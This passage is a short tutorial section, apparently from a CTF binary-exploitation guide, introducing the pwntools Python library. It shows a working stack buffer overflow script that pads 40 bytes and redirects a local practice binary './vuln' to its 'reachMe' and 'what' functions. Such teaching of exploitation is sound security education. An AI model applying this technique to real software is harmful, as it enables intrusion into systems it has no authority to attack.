# Pwntools
## 7. Using Pwntools to make life easy
**Pwntools** is a Python library for CTF-style binary exploitation.
It helps with:
- Packing/unpacking integers (addresses) in little-endian
- Spawning processes or remote connections
- Sending/receiving data
- Automating exploit steps
Example of the same exploit in pwntools-style:
```python
from pwn import *

# Adjust context (arch, OS)
context.binary = "./vuln"
elf = context.binary

# Addresses from analysis:
offset = 40
reachMe = elf.symbols["reachMe"]    # nice shortcut if symbols present
what    = elf.symbols["what"]       # newline/flush function

p = process(elf.path)

payload  = b"A" * offset
payload += p64(reachMe)
payload += p64(what)

p.sendline(payload)
print(p.recvall().decode(errors="ignore"))
```
`p64()` packs a 64-bit address into the right little-endian bytes.
